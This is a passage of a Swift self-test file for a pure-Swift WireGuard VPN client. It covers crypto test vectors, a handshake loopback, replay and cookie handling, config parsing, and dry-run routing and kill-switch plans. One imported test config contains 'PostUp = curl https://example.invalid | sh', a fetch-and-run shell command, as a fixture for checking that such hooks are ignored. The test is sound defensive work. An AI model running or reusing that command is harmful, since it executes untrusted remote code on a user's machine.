import Foundation
import RampartShared
import RampartVPN

// RamPart VPN (pure-Swift WireGuard). Nothing here creates a utun, touches routes / DNS / pf or the Keychain:
// the system layer is checked as generated commands through DryRunVPNRunner, keys use MemoryVPNKeyStore.
extension SelfTest {
    static func vpnChecks() {
        vpnBlake2s()
        vpnPrimitives()
        vpnNoiseVector()
        vpnWireGuardVector()
        vpnReplayWindow()
        vpnLoopback()
        vpnCookie()
        vpnConfig()
        vpnPlan()
        vpnPolicy()
        vpnServiceDryRun()
    }

    static func hx(_ s: String) -> [UInt8] { WGKey.fromHex(s) ?? [] }

    // MARK: BLAKE2s (RFC 7693)

    static func vpnBlake2s() {
        check(WGKey.hex(BLAKE2s.hash(Array("abc".utf8))) == "508c5e8c327c14e2e1a72ba34eeb452f37458b209ed63a294d999b4c86675982", "blake2s RFC 7693 appendix B 'abc'")
        check(WGKey.hex(BLAKE2s.hash([])) == "69217a3079908094e11121d042354a7c1f55b6482ca1a51e1b250dfd1ed0eef9", "blake2s empty input")
        // RFC 7693 appendix E self-test: every digest length x input length, unkeyed and keyed, hashed together.
        func seq(_ len: Int, _ seed: UInt32) -> [UInt8] {
            var a: UInt32 = 0xDEAD4BAD &* seed, b: UInt32 = 1
            return (0..<len).map { _ in let t = a &+ b; a = b; b = t; return UInt8(t >> 24 & 0xff) }
        }
        var grand = BLAKE2s(outputLength: 32)
        for outlen in [16, 20, 28, 32] {
            for inlen in [0, 3, 64, 65, 255, 1024] {
                let input = seq(inlen, UInt32(inlen))
                grand.update(BLAKE2s.hash(input, outputLength: outlen))
                grand.update(BLAKE2s.hash(input, outputLength: outlen, key: seq(outlen, UInt32(outlen))))
            }
        }
        check(WGKey.hex(grand.finalize()) == "6a411f08ce25adcdfb02aba641451cec53c598b24f4fc787fbdc88797f4c1dfe", "blake2s RFC 7693 appendix E self-test")
        check(WGKey.hex(BLAKE2s.hash(Array("abc".utf8), outputLength: 16)) == "aa4938119b1dc7b87cbad0ffd200d0ae"
              && WGKey.hex(BLAKE2s.hash(Array("abc".utf8), outputLength: 20)) == "5ae3b99be29b01834c3b508521ede60438f8de17", "blake2s shorter digests (16, 20)")
        // BLAKE2 reference KAT (keyed, empty message, key 00..1f)
        check(WGKey.hex(BLAKE2s.hash([], key: Array(0..<32))) == "48a8997da407876b3d79c0d92325ad3b89cbb754d86ab71aee047ad345fd2c49", "blake2s keyed KAT")
        // Incremental updates across block boundaries equal one-shot.
        let big = (0..<1000).map { UInt8($0 & 0xff) }
        var inc = BLAKE2s(); inc.update(Array(big[0..<1])); inc.update(Array(big[1..<64])); inc.update(Array(big[64..<129])); inc.update(Array(big[129...]))
        check(inc.finalize() == BLAKE2s.hash(big), "blake2s incremental == one-shot")
    }

    // MARK: HMAC/HKDF constants, TAI64N, HChaCha20 / XChaCha20-Poly1305

    static func vpnPrimitives() {
        // WireGuard's published initial chaining key and hash.
        let ci = WGHash.hash(Array(WG.construction.utf8))
        check(WGKey.hex(ci) == "60e26daef327efc02ec335e2a025d2d016eb4206f87277f52d38d1988b78cd36", "wireguard initial chaining key")
        check(WGKey.hex(WGHash.hash(ci, WG.identifier)) == "2211b361081ac566691243db458ad5322d9c6c662293e8b70ee19c65ba079ef3", "wireguard initial hash")
        let k = WGHash.kdf(3, key: ci, input: [1, 2, 3])
        check(k.count == 3 && k.allSatisfy { $0.count == 32 } && Set(k.map(WGKey.hex)).count == 3, "kdf3 gives three distinct keys")
        check(WGHash.kdf(1, key: ci, input: [1, 2, 3])[0] == k[0], "kdf1 is the prefix of kdf3")

        let t = TAI64N.encode(seconds: 1_700_000_000, nanoseconds: 5)
        check(t.count == 12 && t[0] == 0x40 && TAI64N.decode(t)?.seconds == 1_700_000_000 && TAI64N.decode(t)?.nanoseconds == 5, "tai64n round trip")
        check(TAI64N.isAfter(TAI64N.encode(seconds: 1_700_000_000, nanoseconds: 6), t) && !TAI64N.isAfter(t, t), "tai64n ordering")

        // draft-irtf-cfrg-xchacha-03 section 2.2.1 (HChaCha20) and appendix A.3.1 (XChaCha20-Poly1305)
        let hk = WGCrypto.hchacha20(key: Array(0..<32), nonce: hx("000000090000004a0000000031415927"))
        check(WGKey.hex(hk) == "82413b4227b27bfed30e42508a877d73a0f9e4d58a74a853c12ec41326d3ecdc", "hchacha20 test vector")
        let plain = Array("Ladies and Gentlemen of the class of '99: If I could offer you only one tip for the future, sunscreen would be it.".utf8)
        let sealed = (try? WGCrypto.xseal(key: Array(0x80...0x9f), nonce: Array(0x40...0x57), plain, ad: hx("50515253c0c1c2c3c4c5c6c7"))) ?? []
        check(WGKey.hex(Array(sealed.suffix(16))) == "c0875924c1c7987947deafd8780acf49", "xchacha20-poly1305 test vector tag")
        check(WGKey.hex(Array(sealed.prefix(16))) == "bd6d179d3e83d43b9576579493c0e939", "xchacha20-poly1305 test vector ciphertext")
        check((try? WGCrypto.xopen(key: Array(0x80...0x9f), nonce: Array(0x40...0x57), sealed, ad: hx("50515253c0c1c2c3c4c5c6c7"))) == plain, "xchacha20-poly1305 opens")
        var bad = sealed; bad[3] ^= 1
        check((try? WGCrypto.xopen(key: Array(0x80...0x9f), nonce: Array(0x40...0x57), bad, ad: [])) == nil, "xchacha20-poly1305 rejects tampering")

        // Keys
        let priv = WGCrypto.generatePrivateKey()
        check(priv.count == 32 && priv[0] & 7 == 0 && priv[31] & 0x80 == 0 && priv[31] & 0x40 != 0, "generated private key is clamped")
        check(WGKey.decode(WGKey.base64(priv)) == priv && WGKey.decode("short") == nil, "base64 key round trip")
        check((try? WGCrypto.dh(priv, [UInt8](repeating: 0, count: 32))) == nil, "DH with a low-order public key is rejected")
    }

    // MARK: official Noise test vector (cacophony: Noise_IKpsk2_25519_ChaChaPoly_BLAKE2s)

    static func vpnNoiseVector() {
        let prologue = hx("4a6f686e2047616c74")
        let psk = hx("54686973206973206d7920417573747269616e20706572737065637469766521")
        let initStatic = hx("e61ef9919cde45dd5f82166404bd08e38bceb5dfdfded0a34c8df7ed542214d1")
        let initEph = hx("893e28b9dc6ca8d611ab664754b8ceb7bac5117349a4439a6b0569da977c464a")
        let respStatic = hx("4a3acbfdb163dec651dfa3194dece676d437029c62a408b4c5ea9114246e4893")
        let respEph = hx("bbdb4cdbd309f1a1f2e1456967fe288cadd6f712d65dc7b7793d5e63da6b375b")
        let remote = hx("31e0303fd6418d2f8c0e78b91f22e8caed0fbe48656dcf4767e4834f701b8f62")
        check((try? WGCrypto.publicKey(respStatic)) == remote, "noise vector: responder public key")
        let msgs: [(String, String)] = [
            ("4c756477696720766f6e204d69736573", "ca35def5ae56cec33dc2036731ab14896bc4c75dbb07a61f879f8e3afa4c7944001e21de9f98ddd8e2ad57527207feb56253c9c94a9e496782ecfcb2a75fbcaf1b52948cc48daefe660c62119ab5000980c84831215f2441eba616548e832985464cf17e51ee93109008399a21f7e13f"),
            ("4d757272617920526f746862617264", "95ebc60d2b1fa672c1f46a8aa265ef51bfe38e7ccb39ec5be34069f144808843cb765f2caef0751b8f007572dab0322217755c0632f365717edbf34d33e87a"),
            ("462e20412e20486179656b", "8153ca9833bc3c1b91a7e66e5f4d4f5b59bf9e64c2f20d15f0bba7"),
            ("4361726c204d656e676572", "07af0c9c86e1b4e80f36b04ff7688d51141af3debd0332f0a705ef"),
            ("4a65616e2d426170746973746520536179", "6ab1467c0448cc78394494abaaf23afce0e234315d6e2624dcbfa8a21c1c4d073d"),
            ("457567656e2042f6686d20766f6e2042617765726b", "dfc346c0d2296ae6cf1acf6f12b8456a1dba228cf8d8b774aacf1c47fc53aa80ebc7a4c292"),
        ]
        do {
            var i = try NoiseIKpsk2(initiator: true, prologue: prologue, staticPrivate: initStatic, remoteStatic: remote, psk: psk)
            var r = try NoiseIKpsk2(initiator: false, prologue: prologue, staticPrivate: respStatic, remoteStatic: nil, psk: psk)
            let m1 = try i.writeMessage1(ephemeralPrivate: initEph, payload: hx(msgs[0].0))
            check(WGKey.hex(m1.ephemeral + m1.encStatic + m1.encPayload) == msgs[0].1, "noise vector: message 1")
            let p1 = try r.readMessage1(ephemeral: m1.ephemeral, encStatic: m1.encStatic, encPayload: m1.encPayload)
            let initPub = try WGCrypto.publicKey(initStatic)
            check(p1 == hx(msgs[0].0) && r.rs == initPub, "noise vector: responder reads message 1")
            let m2 = try r.writeMessage2(ephemeralPrivate: respEph, payload: hx(msgs[1].0))
            check(WGKey.hex(m2.ephemeral + m2.encPayload) == msgs[1].1, "noise vector: message 2")
            let p2 = try i.readMessage2(ephemeral: m2.ephemeral, encPayload: m2.encPayload)
            check(p2 == hx(msgs[1].0), "noise vector: initiator reads message 2")
            check(WGKey.hex(i.sym.h) == "f5191b875290abcd41347ac3622d9679688a7e980229cb937ef748336cfde0e5" && i.sym.h == r.sym.h, "noise vector: handshake hash")
            let ik = i.transportKeys(), rk = r.transportKeys()
            check(ik.send == rk.receive && ik.receive == rk.send, "noise vector: split keys agree")
            var okTransport = true
            for (n, m) in msgs.dropFirst(2).enumerated() {
                let counter = UInt64(n / 2)
                let key = n % 2 == 0 ? ik.send : rk.send
                let sealed = try WGCrypto.seal(key: key, counter: counter, hx(m.0), ad: [])
                okTransport = okTransport && WGKey.hex(sealed) == m.1
            }
            check(okTransport, "noise vector: transport messages 3-6")
        } catch { check(false, "noise vector threw \(error)") }
    }

    // MARK: WireGuard framing vector (computed by an independent Python reference: hashlib.blake2s + pyca/cryptography)

    static func vpnWireGuardVector() {
        let si = Array(1...32).map(UInt8.init), sr = Array(101...132).map(UInt8.init), ei = Array(201...232).map(UInt8.init)
        let er = [UInt8](repeating: 7, count: 32), q = [UInt8](repeating: 9, count: 32)
        let ts = TAI64N.encode(seconds: 1_700_000_000, nanoseconds: 123_456_789)
        do {
            let srPub = try WGCrypto.publicKey(sr), siPub = try WGCrypto.publicKey(si)
            let ini = try WG.createInitiation(staticPrivate: si, peerPublic: srPub, psk: q, senderIndex: 0x11223344, ephemeralPrivate: ei, timestamp: ts, cookie: nil)
            check(WGKey.hex(ini.message) == "01000000443322114c29f4996985e80d247e80b70303824592ff9fbad74904ea7c3d2bda24e51c12197f3df1f1f385eeca7385af03e3983a5be229054fb3fdc500e176ddd622a02b9e5e64b51975fa696074da3938059ad5d1060d78a6c9458b84fb1e732f16f07bea1983741b9ae453677d25a94877f178b3553dad566a082995f79b7b00000000000000000000000000000000", "wireguard vector: initiation (148 bytes)")
            let c = try WG.consumeInitiation(ini.message, staticPrivate: sr, psk: { $0 == siPub ? q : nil })
            check(c.peerPublic == siPub && c.timestamp == ts && c.peerIndex == 0x11223344, "wireguard vector: responder decrypts static + timestamp")
            let resp = try WG.createResponse(c, senderIndex: 0x55667788, ephemeralPrivate: er, cookie: nil)
            check(WGKey.hex(resp.message) == "02000000887766554433221113be4feaeaf204c7fd3358fc9c00721881d174278128227ec674f37f7fe97b6d52f264d36c7bd2e3b7f79d37956f5ff046c9f854fe83ba27f14d12abbd4247cd00000000000000000000000000000000", "wireguard vector: response (92 bytes)")
            let done = try WG.consumeResponse(resp.message, state: ini.state)
            check(WGKey.hex(done.keys.send) == "86db7fd3ee7d802889f1fa21e6eea05b3e01b0da2ce48fbf8d5784c3ae69d282"
                  && WGKey.hex(done.keys.receive) == "a7f8a35d40fd3a45f4286d0a8db6d5da22643894f965f1ba94389ff73b00698f", "wireguard vector: transport keys")
            check(resp.keys.receive == done.keys.send && resp.keys.send == done.keys.receive, "wireguard vector: both sides derive the same keys")
            let pkt = hx("4500001c0000000040010000" + "0a424202" + "0a424201") + [UInt8](repeating: 0, count: 8)
            let data = try WG.sealData(key: done.keys.send, receiverIndex: 0x55667788, counter: 0, packet: pkt)
            check(WGKey.hex(data) == "04000000887766550000000000000000d807323231dca09c1c47ae7af0c9703d8862acc0ee7b725c6eacc59c85862d31b428d44db274bf4c2f6d884e5c4aff2b", "wireguard vector: transport data (padded to 16)")
            let opened = try WG.openData(key: resp.keys.receive, data)
            check(WG.trimPadding(opened) == pkt, "wireguard vector: data decrypts and padding is removed")
            // A wrong mac1 (message to someone else) is rejected before any DH.
            var tampered = ini.message; tampered[120] ^= 1
            check((try? WG.consumeInitiation(tampered, staticPrivate: sr, psk: { _ in q })) == nil, "wireguard: bad mac1 rejected")
            check((try? WG.consumeInitiation(ini.message, staticPrivate: sr, psk: { _ in nil })) == nil, "wireguard: unknown initiator rejected")
        } catch { check(false, "wireguard vector threw \(error)") }
    }

    static func vpnReplayWindow() {
        var w = ReplayWindow()
        check(w.accept(0) && w.accept(1) && !w.accept(1) && w.accept(5) && w.accept(3) && !w.accept(3), "replay: duplicates rejected, reordering accepted")
        check(w.accept(3000) && !w.accept(5) && w.accept(3000 - 100) && !w.accept(3000 - 2000), "replay: too-old counters rejected")
        check(!w.accept(WG.rejectAfterMessages), "replay: counter limit")
    }

    // MARK: two in-process peers exchanging packets

    final class VPNFakeClock { var t = Date(timeIntervalSince1970: 1_700_000_000); func advance(_ s: TimeInterval) { t += s } }

    static func ipv4(_ src: [UInt8], _ dst: [UInt8], _ payload: [UInt8]) -> [UInt8] {
        let len = 20 + payload.count
        return [0x45, 0, UInt8(len >> 8), UInt8(len & 0xff), 0, 0, 0, 0, 64, 17, 0, 0] + src + dst + payload
    }
    static func ipv6(_ src: String, _ dst: String, _ payload: [UInt8]) -> [UInt8] {
        [0x60, 0, 0, 0, UInt8(payload.count >> 8), UInt8(payload.count & 0xff), 17, 64] + IPPrefix.parseAddress(src)! + IPPrefix.parseAddress(dst)! + payload
    }

    static func vpnLoopback() {
        let clock = VPNFakeClock()
        let ka = WGCrypto.generatePrivateKey(), kb = WGCrypto.generatePrivateKey()
        let psk = WGCrypto.randomBytes(32)
        guard let pa = try? WGCrypto.publicKey(ka), let pb = try? WGCrypto.publicKey(kb),
              let a = try? WireGuardPeer(privateKey: ka, peer: WGPeerConfig(publicKey: pb, presharedKey: psk, endpoint: WGEndpoint(host: "192.0.2.2", port: 51820),
                                                                             allowedIPs: [IPPrefix("10.9.0.2/32")!, IPPrefix("fd00::2/128")!]), now: { clock.t }, jitter: { 0 }),
              let b = try? WireGuardPeer(privateKey: kb, peer: WGPeerConfig(publicKey: pa, presharedKey: psk, endpoint: nil,
                                                                             allowedIPs: [IPPrefix("10.9.0.1/32")!, IPPrefix("fd00::1/128")!]), now: { clock.t }, jitter: { 0 })
        else { check(false, "loopback: peers"); return }
        var up = true
        var toA: [[UInt8]] = [], toB: [[UInt8]] = []
        var fromA: [[UInt8]] = []
        var gotA: [[UInt8]] = [], gotB: [[UInt8]] = []
        var eventsA: [WireGuardPeer.Event] = [], eventsB: [WireGuardPeer.Event] = []
        a.sendUDP = { m, _ in fromA.append(m); if up { toB.append(m) } }
        b.sendUDP = { m, _ in if up { toA.append(m) } }
        a.deliverPacket = { gotA.append($0) }; b.deliverPacket = { gotB.append($0) }
        a.onEvent = { eventsA.append($0) }; b.onEvent = { eventsB.append($0) }
        func pump() {
            var n = 0
            while (!toA.isEmpty || !toB.isEmpty) && n < 1000 {
                n += 1
                if !toB.isEmpty { b.receiveUDP(toB.removeFirst(), from: WGEndpoint(host: "192.0.2.1", port: 40000)) }
                if !toA.isEmpty { a.receiveUDP(toA.removeFirst(), from: WGEndpoint(host: "192.0.2.2", port: 51820)) }
            }
        }
        let p1 = ipv4([10, 9, 0, 1], [10, 9, 0, 2], Array("hello through the tunnel".utf8))
        a.sendPacket(p1)
        check(a.isHandshaking && !a.hasUsableSession, "loopback: first packet starts a handshake")
        pump()
        check(eventsA.contains(.handshakeComplete) && eventsB.contains(.handshakeComplete), "loopback: handshake completes on both sides")
        check(gotB == [p1], "loopback: queued packet delivered after the handshake")
        let p2 = ipv4([10, 9, 0, 2], [10, 9, 0, 1], Array("reply".utf8))
        b.sendPacket(p2); pump()
        check(gotA == [p2], "loopback: reply delivered")
        let p6 = ipv6("fd00::1", "fd00::2", Array("v6 payload".utf8))
        a.sendPacket(p6); pump()
        check(gotB.last == p6, "loopback: IPv6 packet delivered")
        check(a.stats.txPackets == 2 && b.stats.rxPackets == 2 && a.stats.txBytes == UInt64(p1.count + p6.count), "loopback: counters")
        // Replay of a captured data message is dropped.
        let dropped = b.stats.droppedPackets, before = gotB.count
        if let lastData = fromA.last(where: { WG.messageType($0) == WG.typeData && $0.count > 32 }) { b.receiveUDP(lastData, from: WGEndpoint(host: "192.0.2.1", port: 40000)) }
        check(gotB.count == before && b.stats.droppedPackets == dropped + 1, "loopback: replayed data message rejected")
        // Replayed handshake initiation is rejected (timestamp not newer).
        if let ini = fromA.first(where: { WG.messageType($0) == WG.typeInitiation }) {
            let d0 = b.stats.droppedPackets; b.receiveUDP(ini, from: WGEndpoint(host: "192.0.2.1", port: 40000))
            check(b.stats.droppedPackets == d0 + 1, "loopback: replayed initiation rejected")
            toA.removeAll()
        }
        // Cryptokey routing: spoofed source and disallowed destination.
        a.sendPacket(ipv4([10, 9, 0, 99], [10, 9, 0, 2], [1])); pump()
        check(gotB.count == before, "loopback: packet with a source outside AllowedIPs is dropped by the receiver")
        let txBefore = a.stats.txPackets
        a.sendPacket(ipv4([10, 9, 0, 1], [8, 8, 8, 8], [1]))
        check(a.stats.txPackets == txBefore, "loopback: destination outside AllowedIPs is not sent")
        // Passive keepalive: B sends data, A replies with a keepalive after 10 s of silence.
        clock.advance(1); b.sendPacket(p2); pump()
        let sentBefore = fromA.count
        clock.advance(10.5); a.tick(); pump()
        check(fromA.count == sentBefore + 1 && fromA.last?.count == 32, "loopback: keepalive after KEEPALIVE_TIMEOUT")
        // Rekey after REKEY_AFTER_TIME: the next packet starts a new handshake; traffic continues.
        let hs = a.stats.handshakes
        clock.advance(121); a.sendPacket(p1); pump()
        check(a.stats.handshakes == hs + 1, "loopback: rekey after 120 s")
        a.sendPacket(p6); pump()
        check(gotB.last == p6, "loopback: traffic continues on the new session")
        // Server unreachable: retransmit every REKEY_TIMEOUT, give up after REKEY_ATTEMPT_TIME.
        up = false
        clock.advance(181)
        let attempts = a.stats.handshakeAttempts
        a.sendPacket(p1)
        for _ in 0..<95 { clock.advance(1); a.tick() }
        check(eventsA.contains(.handshakeGaveUp), "loopback: gives up after 90 s")
        check(a.stats.handshakeAttempts - attempts >= 17 && a.stats.handshakeAttempts - attempts <= 20, "loopback: retransmits every 5 s (\(a.stats.handshakeAttempts - attempts))")
        // Keys are erased after 3 x REJECT_AFTER_TIME without a new session.
        clock.advance(600); a.tick()
        check(eventsA.contains(.keysExpired) && !a.hasUsableSession, "loopback: keys erased after 540 s")
        // Comes back when the network returns.
        up = true
        a.sendPacket(p1); pump()
        check(a.hasUsableSession && gotB.last == p1, "loopback: reconnects when the server is reachable again")
    }

    // MARK: cookie reply (responder under load)

    static func vpnCookie() {
        let clock = VPNFakeClock()
        let kc = WGCrypto.generatePrivateKey(), kd = WGCrypto.generatePrivateKey()
        guard let pc = try? WGCrypto.publicKey(kc), let pd = try? WGCrypto.publicKey(kd),
              let c = try? WireGuardPeer(privateKey: kc, peer: WGPeerConfig(publicKey: pd, endpoint: WGEndpoint(host: "192.0.2.2", port: 51820), allowedIPs: [IPPrefix("0.0.0.0/0")!]), now: { clock.t }, jitter: { 0 }),
              let d = try? WireGuardPeer(privateKey: kd, peer: WGPeerConfig(publicKey: pc, endpoint: nil, allowedIPs: [IPPrefix("10.0.0.2/32")!]), now: { clock.t }, jitter: { 0 })
        else { check(false, "cookie: peers"); return }
        d.underLoad = true
        var toC: [[UInt8]] = [], toD: [[UInt8]] = []
        var ev: [WireGuardPeer.Event] = []
        c.sendUDP = { m, _ in toD.append(m) }; d.sendUDP = { m, _ in toC.append(m) }
        c.onEvent = { ev.append($0) }
        func pump() { while !toC.isEmpty || !toD.isEmpty {
            if !toD.isEmpty { d.receiveUDP(toD.removeFirst(), from: WGEndpoint(host: "198.51.100.7", port: 40000)) }
            if !toC.isEmpty { c.receiveUDP(toC.removeFirst(), from: WGEndpoint(host: "192.0.2.2", port: 51820)) }
        } }
        c.initiateHandshake(); pump()
        check(ev == [.cookieReceived] && c.stats.cookieReplies == 1 && !c.hasUsableSession, "cookie: responder under load answers with a cookie reply")
        clock.advance(5.1); c.tick(); pump()
        check(ev.contains(.handshakeComplete) && c.hasUsableSession, "cookie: retry carries mac2 and completes")
    }

    // MARK: config import / home server setup

    static func vpnConfig() {
        let priv = WGCrypto.generatePrivateKey(), server = WGCrypto.generatePrivateKey()
        let spub = WGKey.base64((try? WGCrypto.publicKey(server)) ?? [])
        let text = """
        # exported from the WireGuard app
        [Interface]
        PrivateKey = \(WGKey.base64(priv))
        Address = 10.66.66.2/32, fd66:66:66::2/128
        DNS = 1.1.1.1, home.lan
        MTU = 1380
        PostUp = curl https://example.invalid | sh

        [Peer]
        PublicKey = \(spub)
        PresharedKey = \(WGKey.base64(WGCrypto.randomBytes(32)))
        Endpoint = imac.local:51820
        AllowedIPs = 0.0.0.0/0, ::/0
        PersistentKeepalive = 25
        """
        do {
            let c = try WGQuickConfig.parse(text)
            check(c.privateKey == priv && c.addresses.count == 2 && c.dnsServers == ["1.1.1.1"] && c.dnsSearch == ["home.lan"], "config: interface parsed")
            check(c.endpointHost == "imac.local" && c.endpointPort == 51820 && c.persistentKeepalive == 25 && c.mtu == 1380, "config: peer parsed")
            check(c.isFullTunnel.v4 && c.isFullTunnel.v6, "config: full tunnel detected")
            check(c.warnings.contains { $0.contains("PostUp") }, "config: PostUp is ignored with a warning (never executed)")
            check((try? WGQuickConfig.parse(c.render())) == { var x = c; x.warnings = []; return x }(), "config: render/parse round trip")
            check(!c.render(redactSecrets: true).contains(WGKey.base64(priv)), "config: redacted render hides the private key")
            let profile = VPNProfile(name: "x", config: c, createdBy: "import")
            let json = String(decoding: (try? JSONEncoder().encode(profile)) ?? Data(), as: UTF8.self)
            check(!json.contains(WGKey.base64(priv)) && !json.contains(WGKey.base64(c.presharedKey)), "config: stored profile has no secrets")
        } catch { check(false, "config parse threw \(error)") }
        check(catchParse(text + "\n[Peer]\nPublicKey = \(spub)\nEndpoint = 1.2.3.4:1\nAllowedIPs = 10.0.0.0/8\n") == .multiplePeers, "config: more than one peer refused")
        check(catchParse(text.replacingOccurrences(of: spub, with: "not-a-key")) == .invalid("peer PublicKey"), "config: bad key refused")
        check(catchParse("hello") != nil && catchParse("") == .empty, "config: random text refused")
        check(WGQuickConfig.parseEndpoint("[2001:db8::1]:51820").map { $0.host == "2001:db8::1" && $0.port == 51820 } == true, "config: IPv6 endpoint")
        check(WGQuickConfig.parseEndpoint("example.com:0") == nil && WGQuickConfig.parseEndpoint("bad host:1") == nil, "config: bad endpoints refused")

        // Home server kit with fixed keys.
        let s = WGCrypto.generatePrivateKey(), cl = WGCrypto.generatePrivateKey(), psk = WGCrypto.randomBytes(32)
        guard let r = try? HomeServerSetup.generate(endpointHost: "imac.local", privateKeys: (s, cl, psk)) else { check(false, "home server: generate"); return }
        let clPub = WGKey.base64((try? WGCrypto.publicKey(cl)) ?? []), sPub = WGKey.base64((try? WGCrypto.publicKey(s)) ?? [])
        check(r.clientConfig.peerPublicKey == (try? WGCrypto.publicKey(s)) && r.clientConfig.privateKey == cl, "home server: client config points at the server key")
        check(r.kit.raspberryPiConfig.contains("PublicKey = \(clPub)") && r.kit.macConfig.contains("PublicKey = \(clPub)") && r.kit.serverPublicKey == sPub, "home server: server configs list this Mac")
        check(r.kit.raspberryPiConfig.contains("ListenPort = 51820") && r.kit.raspberryPiConfig.contains("MASQUERADE"), "home server: Pi config forwards + NATs")
        check(r.kit.macConfig.contains("pfctl -a com.apple/rampart-vpn-server") && r.kit.macConfig.contains("net.inet.ip.forwarding=1"), "home server: macOS config NATs with pf")
        check(r.kit.raspberryPiCommands.contains("apt install -y wireguard") && r.kit.raspberryPiCommands.contains("wg-quick@wg0"), "home server: Raspberry Pi OS commands")
        check(r.kit.macCommands.contains("brew install wireguard-tools") && r.kit.macCommands.contains("wg-quick up wg0"), "home server: Homebrew commands")
        check(r.kit.notes.first?.contains("only works while this Mac is on your home network") == true, "home server: honest note about .local names")
        check(!r.kit.raspberryPiCommands.contains(WGKey.base64(cl)) && !r.kit.macConfig.contains(WGKey.base64(cl)), "home server: this Mac's private key never appears in the kit")
        check((try? WGQuickConfig.parse(r.clientConfig.render()))?.allowedIPs == ["0.0.0.0/0", "::/0"], "home server: client config is valid wg-quick")
        check((try? WGQuickConfig.parse(r.kit.raspberryPiConfig.replacingOccurrences(of: "[Peer]", with: "[Peer]\nEndpoint = 1.2.3.4:5"))) != nil, "home server: server config parses as wg-quick")
        check((try? HomeServerSetup.generate(endpointHost: "bad host!")) == nil, "home server: bad host refused")
    }

    static func catchParse(_ t: String) -> WGQuickConfig.ParseError? {
        do { _ = try WGQuickConfig.parse(t); return nil } catch let e as WGQuickConfig.ParseError { return e } catch { return nil }
    }

    // MARK: system plan (commands only; nothing runs)

    static func vpnPlan() {
        var c = WGQuickConfig(privateKey: WGCrypto.generatePrivateKey(), peerPublicKey: WGCrypto.randomBytes(32), endpointHost: "203.0.113.5", endpointPort: 51820)
        c.addresses = ["10.66.66.2/32", "fd66:66:66::2/128"]; c.dnsServers = ["1.1.1.1"]; c.allowedIPs = ["0.0.0.0/0", "::/0"]
        var p = VPNNetworkPlan(interface: "utun7", config: c, endpointIP: "203.0.113.5", localUDPPort: 40123, gateway4: "192.168.1.1", gateway6: "fe80::1%en0",
                               dnsFilterActive: false, killSwitch: true)
        let addr = p.addressCommands().map(\.description)
        check(addr.contains("ifconfig utun7 inet 10.66.66.2/32 10.66.66.2 alias") && addr.contains("ifconfig utun7 inet6 fd66:66:66::2/128 alias") && addr.contains("ifconfig utun7 mtu 1420"), "plan: interface addresses")
        let up = p.routeUpCommands().map(\.description)
        check(up.first == "route -q -n add -inet 203.0.113.5 -gateway 192.168.1.1", "plan: endpoint keeps the real gateway (no routing loop)")
        check(["0.0.0.0/1", "128.0.0.0/1", "::/1", "8000::/1"].allSatisfy { r in up.contains { $0.contains(" \(r) -interface utun7") } }, "plan: IPv4 + IPv6 default routed into the tunnel")
        check(p.routeDownCommands().count == up.count, "plan: every route is removed again")
        let dns = p.dnsUpCommand()?.stdin ?? ""
        check(dns.contains("ServerAddresses * 1.1.1.1") && dns.contains("OverridePrimary # 1") && dns.contains("State:/Network/Service/app.rampart.vpn/DNS"), "plan: DNS via scutil")
        check(VPNNetworkPlan.dnsDownCommand().stdin?.contains("remove State:/Network/Service/app.rampart.vpn/DNS") == true, "plan: DNS restore removes our keys")
        p.dnsFilterActive = true
        check(p.dnsUpCommand()?.stdin?.contains("ServerAddresses * 127.0.0.1") == true, "plan: with the DNS filter on, DNS stays on RamPart's filter (which forwards over the tunnel)")
        let rules = p.killSwitchRules()
        check(rules.contains("pass out quick inet proto udp from any port 40123 to 203.0.113.5 port 51820") && rules.contains("pass quick on utun7 all")
              && rules.contains("block drop out quick all"), "plan: kill switch passes only the tunnel + the WireGuard flow")
        check(VPNNetworkPlan.pfAnchor > "com.apple/249.RampartEmergency" && VPNNetworkPlan.pfAnchor.lowercased().contains("rampart"), "plan: kill switch anchor sorts after the emergency anchor and is found by the Super Kill Switch")
        check(VPNNetworkPlan.parseRouteGet("   route to: default\ndestination: default\n    gateway: 192.168.1.1\n  interface: en0\n").gateway == "192.168.1.1"
              && VPNNetworkPlan.parseRouteGet("gateway: 192.168.1.1\ninterface: en0").interface == "en0", "plan: route get parser")
        check(VPNNetworkPlan.parsePFToken("pf enabled\nToken : 1234567\n") == "1234567" && VPNNetworkPlan.parsePFToken("nope") == nil, "plan: pf token parser")
        var split = c; split.allowedIPs = ["10.66.66.0/24"]
        let sp = VPNNetworkPlan(interface: "utun7", config: split, endpointIP: "203.0.113.5", localUDPPort: 1, gateway4: "192.168.1.1", gateway6: nil, dnsFilterActive: false, killSwitch: false)
        check(sp.routeUpCommands().map(\.description) == ["route -q -n add -inet 10.66.66.0/24 -interface utun7"] && sp.dnsUpCommand()?.stdin?.contains("OverridePrimary") == false, "plan: split tunnel routes only its prefix")
        // Development safety
        if ProcessInfo.processInfo.environment["RAMPART_NO_PRIVILEGED_TOOLS"] == "1" || getuid() != 0 {
            check(!LiveVPNRunner.allowed && LiveVPNRunner().run(VPNCommand("/sbin/route", ["-n", "get", "default"])).status == -1, "plan: live runner refuses in development")
            check((try? UTunDevice(queue: DispatchQueue(label: "t"))) == nil, "plan: no utun in development")
        }
    }

    static func vpnPolicy() {
        typealias I = VPNAutoConnectPolicy.Input
        check(VPNAutoConnectPolicy.decide(I(onWiFi: true, trusted: true, insecure: false, captivePortal: nil, attacked: false, networkName: "Home")) == .none, "auto: trusted network stays direct")
        if case .connect = VPNAutoConnectPolicy.decide(I(onWiFi: true, trusted: false, insecure: true, captivePortal: false, attacked: false, networkName: "Cafe")) {} else { check(false, "auto: open Wi-Fi connects") }
        if case .connect = VPNAutoConnectPolicy.decide(I(onWiFi: true, trusted: true, insecure: false, captivePortal: nil, attacked: true, networkName: "Home")) {} else { check(false, "auto: attacked network connects even if trusted") }
        if case .wait = VPNAutoConnectPolicy.decide(I(onWiFi: true, trusted: false, insecure: true, captivePortal: true, attacked: false, networkName: "Hotel")) {} else { check(false, "auto: waits for captive portal sign-in") }
        if case .connect(let r) = VPNAutoConnectPolicy.decide(I(onWiFi: true, trusted: false, insecure: false, captivePortal: nil, attacked: false, networkName: "Office")) {
            check(r.hasPrefix("auto"), "auto: untrusted WPA2 network connects")
        } else { check(false, "auto: untrusted WPA2 network connects") }
        check(VPNAutoConnectPolicy.decide(I(onWiFi: false, trusted: false, insecure: true, captivePortal: nil, attacked: false, networkName: "")) == .none, "auto: not on Wi-Fi")
    }

    // MARK: the daemon service, dry run, against an in-process server peer

    final class VPNLoopDatagram: TunnelDatagramIO {
        let localPort: UInt16 = 40123
